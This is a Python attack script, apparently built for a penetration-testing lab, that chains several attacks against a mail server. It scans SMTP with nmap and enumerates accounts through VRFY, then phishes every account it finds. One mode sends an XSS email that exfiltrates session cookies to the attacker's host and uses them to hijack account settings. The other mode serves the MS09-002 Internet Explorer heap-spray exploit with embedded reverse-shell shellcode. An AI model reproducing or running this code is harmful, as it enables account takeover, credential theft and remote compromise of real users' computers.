#!/usr/bin/env python3

# MS09-002 script: https://www.exploit-db.com/exploits/8152 (Ahmed Obied (ahmed.obied@gmail.com))

from os.path import realpath, dirname
from os import system, environ, popen, kill
from filecmp import cmp as file_cmp
from psutil import net_connections
from signal import SIGTERM
from subprocess import Popen
from pathlib import Path
from smtplib import SMTP
from time import sleep
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import http.server
import socketserver
import requests
import sys
import urllib.parse
import nmap
import asyncore
import smtpd
import socket

# nmap scan
  # check if host alive
  # check for Merak 8.9.1 or compatiable server
	# TCP/25

# check if user list
    # download a good list

# manually attempt to get the domain + usernames
	# socket convo
	# iterate through users
	# parse the reply traffic for domain
	# store results

# drum up web server to host shell payloads
	# find a script somewhere or do it manually
	# determine encoding

# drum up reverse shell listener
	# multi connection

_Gr="\u001b[32;1m"
_End="\u001b[0m"
_Blu="\u001b[34;1m"

clean = False
debug = 0
RHOST=None          # Global RHOST
RPORT_WEB=32000     # Web service
RPORT_SMTP=25
LHOST=(popen('ifconfig tap0 | grep -w "inet" | cut -d" " -f10').read()).strip()
LPORT_WEB=8080
LPORT_SMTP=25
mode = "cookie_monster"
for i,x in enumerate(sys.argv):
    if x.lower() in ["-r","--rhost"]:
        RHOST=sys.argv[i+1]
    elif x.lower() in ["-l","--lhost"]:
        LHOST=sys.argv[i+1]
    elif x.lower() in ["-p","--rport_web"]:
        RPORT_WEB=int(sys.argv[i+1])
    elif x.lower() in ["-lpw","--lport_web"]:
        LPORT_WEB=int(sys.argv[i+1])
    elif x.lower() in ["-rps","--rport_smtp"]:
        RPORT_SMTP=int(sys.argv[i+1])
    elif x.lower() in ["-lps","--lport_smtp"]:
        LPORT_SMTP=int(sys.argv[i+1])
    elif x.lower() in ["-d"]:
        debug = 1
    elif x.lower() in ["-dd"]:
        debug = 2
    elif x.lower() in ["--clean"]:
        clean = True
    elif x.lower() in ["-m","--mode"]:
        mode = sys.argv[i+1]

        
if RHOST is None:
    sys.stderr.write("[-] RHOST (-r / --rhost) is mandatory!\n\n")
    sys.exit(-1)
if debug > 0:
    print(f"[*] Using RHOST: {RHOST}")
    print(f"[*] Using RPORT_WEB: {RPORT_WEB}")
    print(f"[*] Using RPORT_SMTP:{RPORT_SMTP}")

if LHOST == '':
    sys.stderr.write("[-] Tap0 not up.  Are you conencted to the lab\n")
    sys.exit(-1)
if debug > 0:
    print(f"[*] Using LHOST: {LHOST}")
    print(f"[*] Using LPORT_WEB: {LPORT_WEB}")
    print(f"[*] Using LPORT_SMTP:{LPORT_SMTP}")

if mode not in ["cookie_monster","pwn"]:
    sys.stderr.write("[-] Modes Availible: 'cookie-monster' 'pwn'\n")
    sys.exit(-1)
if debug > 0:
    print(f"[*] Using mode: {mode}")

if clean:
    if debug > 0:
        sys.stdout.write(f"{_Blu}[D] Cleaning things up...{_End} \n")
    system( "rm ./cirt-default-usernames.txt 1>/dev/null 2>&1")


# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;; INITIAL RECON ;;;;;;;;
# Host detection and service detection
nmap_args = f"-sS -p{RPORT_SMTP}"
nm = nmap.PortScanner()
nm.scan(hosts=RHOST,arguments=nmap_args)

if nm[RHOST]['status']['state'] not in ['up']:
    sys.stderr.write(f"[-] Host {RHOST} is not up\n\n")
    sys.exit(-1)
print(f"{_Gr}[+] {RHOST} appears up{_End}")

if nm[RHOST]['tcp'][RPORT_SMTP]['state'] not in ['open','open|filtered']:
    sys.stderr.write(f"[-] Port {RPORT_SMTP} is not open on rhost {RHOST}\n\n")
    sys.exit(-1)
print(f"{_Gr}[+] {RHOST}:{RPORT_SMTP} appears open{_End}")


# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;;; Gathering wordlist  ;;;;;;;;;;;
list_file = './cirt-default-usernames.txt'
smtpusers = Path(list_file)
if not smtpusers.exists():
    sys.stdout.write("[*] Fetching a better list file than what nmap provides by default..\n")
    url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/cirt-default-usernames.txt"
    with open(list_file,"wb") as list_file_fd:
        response = requests.get(url)
        list_file_fd.write(response.content)
    print(f"[*] List file saved as: {list_file}")
else:
    print("[*] Looks like an smtp users list is already present")
sys.stdout.flush()


# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;;; User account enumeration ;;;;;;

# Connection and greeting
ctr = 0
ctr_total = 0
accounts = []
sys.stdout.write(   "[*] Enumerating email accounts\n"\
                    "+------------------------------+\n"\
                    "| '.' = invalid list entry     |\n"\
                    "| '*' = account doesn't exist  |\n"\
                    "| '!' = account found          |\n"\
                    "-------------------------------+\n")
sys.stdout.flush()
with open(list_file,"r") as fd:
    for line in fd:
        line = line.strip()

        if ctr == 50:
            ctr = 0
            ctr_total += 50
            sys.stdout.write(f"[{ctr_total}]\n")
            sys.stdout.flush()

        if not line.isalnum():
            ctr +=  1
            sys.stdout.write(".")
            sys.stdout.flush()
            continue

        smtp_fd = SMTP(RHOST,RPORT_SMTP)
        smtp_fd.helo("40299")
        
        result = smtp_fd.verify(f"{line}")

        if "No such user found" in result[1].decode():
            sys.stdout.write("*")
            sys.stdout.flush()
            ctr += 1
            continue
        elif line in result[1].decode():
            if line in result[1].decode().split('<')[1].split('>')[0]:
                ctr += 1
                sys.stdout.write(f"{_Gr}!{_End}")
                account = result[1].decode().split('<')[1].split('>')[0]
                accounts.append(account)

sys.stdout.write(   f"\n"
                    f"Accounts found\n"
                    f"--------------\n")
for account in accounts:
    print(f"{_Gr}{account}{_End}")

# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;;; Phish Selection ;;;;;;;;;


    # If cookie monster / cookie stealing .... 
    if mode == "cookie_monster":
        email_body = f"""
        '<html>
            <body onload='document.location.replace("http://{LHOST}:{LPORT_WEB}/cookie="+document.cookie+"<br>"+"URL:"+document.location);'>
            </body>
        </html>'
    """

    # If MS09-002 browser exploitation...
    elif mode == "pwn":
        email_body = f"""
        '<html>
            <body onload='document.location.replace("http://{LHOST}:{LPORT_WEB}");'>
            </body>
        </html>'
        """

    email_body = MIMEText(email_body,'html')



for account in accounts:
    
    fromaddr = f"OS-40299@{LHOST}"
    toaddr = account

    hdr_fromaddr = f"From: OS-40299@{LHOST}\r\n"
    hdr_toaddr = f"To: {account}\r\n\r\n"

    message = MIMEMultipart("alternative")
    message["Subject"] = "lol"
    message["From"] = fromaddr
    message["To"] = toaddr
    message.attach(email_body)

    with SMTP(RHOST,RPORT_SMTP) as fd:
        fd.sendmail(fromaddr,toaddr,message.as_string())

# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:
# ;;;;;;;;; Capture credentials ;;;;;;;;;
# ;;;;;;;;; for mis-use later   ;;;;;;;;;

# Listen
# Handle the XSS traffic
# Extract cookie
# place cookie into adding localhost as SMTP
# send the request
# Initiate password reset

class EchoHandler(asyncore.dispatcher_with_send):
    def handle_read(self):
        data = self.recv(8192)
        if data:
            if debug > 0:
                print(f"[D] {data}")
            cookie = ''
            new_id = {}
            new_cookie = {}
            if("GET /cookie=" in data[0:12].decode()):
                sys.stdout.write(f"{_Gr}[+] User Cookie obtained!{_End}\n")
                sys.stdout.flush()
                for i in range(0,len(data)-144):
                    if(data[i:i+4].decode() == "?id="):
                        new_id['id'] = data[i+1:i+36].decode().split('=')[1]
                    if(data[i:i+7].decode() == "cookie="):
                        if "js_cipher=" in data[i+7:i+17].decode():
                            cookie = urllib.parse.unquote(data[i+7:i+75].decode()).split(';')
                        elif "IceWarpWebMailSignUp=" in data[i+7:i+33].decode():
                            cookie = urllib.parse.unquote(data[i+7:i+143].decode()).split(';')
                        elif "IceWarpWebMailSessID=" in data[i+7:i+33].decode():
                            cookie = urllib.parse.unquote(data[i+7:i+143].decode()).split(';')

                for x in cookie:
                    x = x.split('=')
                    for i in range(len(x)-1):
                        if i % 2 == 0:
                            new_cookie[x[i].strip()] = x[i+1].strip()
                
                if debug > 0:
                    print(f"{_Blu}[D] Cookie stirng: {cookie}{_End}")
                    print(f"{_Blu}[D] Cookie parsed: {new_cookie}{_End}")
                    print(f"{_Blu}[D] Id Parsed:     {new_id}{_End}")

                _break = False
                for i in range(0,10):
                    if _break:
                        break
                    print(f"[*] Adding attacker server to alternate email...")
                    post_data = {"id":f"{new_id['id']}","accountid":f"{i}","Save_x":"1","action":"mod","account[USER]":"victim.com\\admin","account[EMAIL]":"admin@victim.com","account[PASS]":"*****","account[PASS2]":"*****","account[FULLNAME]":"Admin","account[ALTEMAIL]":"OS-40299@192.168.102.46","account[HOSTUSER]":"victim.com\\admin","account[COLOR]":"","Save_x":"Save+Changes"}
                    r1 = requests.post(f"http://{RHOST}:{RPORT_WEB}/mail/accountsettings_add.html",data=post_data,cookies=new_cookie)
                    print("[*] Checking to see if worked...")
                    post_data2 = {"id":f"{new_id['id']}","posted":"1","FBmod":"Modify","accountid":f"{i}"}
                    r2 = requests.post(f"http://{RHOST}:{RPORT_WEB}/mail/accountsettingsaction.html",data=post_data2,cookies=new_cookie)
                    
                    if debug > 0:
                         print(f"[D] {r2.text}")
                    
                    for i in range(0,len(r2.text)-103):
                        if '<TD ><INPUT TYPE="text" NAME="account[ALTEMAIL]" VALUE="OS-40299@192.168.102.46"  CLASS="ilong"></TD>' in r2.text[i:i+103]:
                            print(f"{_Gr}[!] Attacker SMTP Server successfully added!{_End}")
                            _break = True
                            break
    
class EchoServer(asyncore.dispatcher):
    def __init__(self, host, port):
        asyncore.dispatcher.__init__(self)
        self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
        self.set_reuse_addr()
        self.bind((host, port))
        self.listen(5)
    def handle_accept(self):
        pair = self.accept()
        if pair is not None:
            sock, addr = pair
            print(f'{_Gr}[+] Incoming connection from {repr(addr)}{_End}')
            handler = EchoHandler(sock)
    
class CustomSMTPServer(smtpd.SMTPServer):
    def process_message(self, peer, mailfrom, rcpttos, data, **kwargs):
        print("----------------------------------------")
        print(f'Receiving message from: {peer}')
        print(f'Message addressed from: {mailfrom}')
        print(f'Message addressed to  : {rcpttos}')
        print(f'Message: {data.decode()}')
        print("-----------------------------------------")
        return
    
if mode == "cookie_monster":
    server1 = EchoServer(LHOST,LPORT_WEB)
    server2 = CustomSMTPServer((LHOST,LPORT_SMTP),None)
    asyncore.loop()



class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def get_payload(self):
        # msfvenom -a x86 --platform windows LHOST=192.168.102.46 LPORT=123 Encoder=PexFnstenvSub -f python -v payload EXITFUNC=process
        # http://metasploit.com
        payload =  ""
        payload += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
        payload += "\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
        payload += "\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
        payload += "\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
        payload += "\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
        payload += "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
        payload += "\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
        payload += "\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
        payload += "\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
        payload += "\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
        payload += "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
        payload += "\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
        payload += "\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
        payload += "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
        payload += "\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
        payload += "\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8"
        payload += "\x66\x2e\x68\x02\x00\x00\x7b\x89\xe6\x6a\x10\x56"
        payload += "\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
        payload += "\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
        payload += "\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
        payload += "\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
        payload += "\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
        payload += "\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
        payload += "\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
        payload += "\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
        payload += "\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
        return self.convert_to_utf16(payload)
    
    def get_exploit(self):
        exploit = '''

        function spray_heap()
        {
            var payload = unescape("<PAYLOAD>");

            var ret = 0x0c0c0c0c;
            var heap_chunk_size = 0x40000;

            var nopsled_size = heap_chunk_size - (payload.length * 2)
            var nopsled = unescape("%u0c0c%u0c0c");
            while (nopsled.length < nopsled_size)
                nopsled += nopsled;

            heap_chunks = new Array();
            heap_chunks_num = (ret - heap_chunk_size)/heap_chunk_size;
            for (var i = 0 ; i < heap_chunks_num ; i++)
                heap_chunks[i] = nopsled + payload;
        }

        function trigger_bug()
        {
            var obj = document.createElement("table");
            obj.click;

            var obj_cp = obj.cloneNode();
            obj.clearAttributes();
            obj = null;

            CollectGarbage();

            var img = document.createElement("img");
            img.src = unescape("%u0c0c%u0c0cCCCCCCCCCCCCCCCCCCCCCC");

            obj_cp.click;
        }

        if (navigator.userAgent.indexOf("MSIE 7") != -1) {
            spray_heap();
            trigger_bug()
        } else
            window.location = "about:blank"

        '''
        exploit = exploit.replace('<PAYLOAD>', self.get_payload())
        exploit = '<html><body><script>' + exploit + '</script></body></html>'
        return exploit.encode('utf-16')
    
    def convert_to_utf16(self, payload):
        # From Beta v2.0 by Berend-Jan Wever
        # http://www.milw0rm.com/exploits/656
        enc_payload = ''
        for i in range(0, len(payload), 2):
            num = 0
            for j in range(0, 2):
                num += (ord(payload[i+j]) & 0xff) << (j*8)
            enc_payload += '%%u%04x' % num
        return enc_payload
    
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        print(f"{_Gr}[<] Sending  payload to {RHOST}:{RPORT_WEB}{_End}")
        self.wfile.write(self.get_exploit())

if mode == "pwn":
    with socketserver.TCPServer((LHOST, LPORT_WEB), RequestHandler) as serv:
        serv.serve_forever()
